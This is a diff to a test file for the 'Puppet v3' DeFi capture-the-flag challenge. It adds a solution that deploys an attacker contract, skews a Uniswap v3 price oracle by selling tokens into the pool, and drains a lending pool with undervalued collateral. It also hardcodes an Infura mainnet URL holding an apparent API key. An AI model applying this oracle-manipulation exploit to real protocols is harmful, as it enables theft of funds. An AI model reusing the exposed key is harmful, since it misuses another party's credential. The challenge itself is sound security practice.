@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://mainnet.infura.io/v3/d9810762762546d3be3da3dcbea01f78";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +140,18 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('PuppetV3Attacker', player)).deploy(
+            uniswapPool.address,
+            token.address,
+            player.address
+        );
+
+        await token.connect(player).transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE)
+        await attacker.connect(player).buyAllWeth();
+        await time.increase(100);
+    
+        await weth.connect(player).approve(lendingPool.address, ethers.utils.parseEther("99"));
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
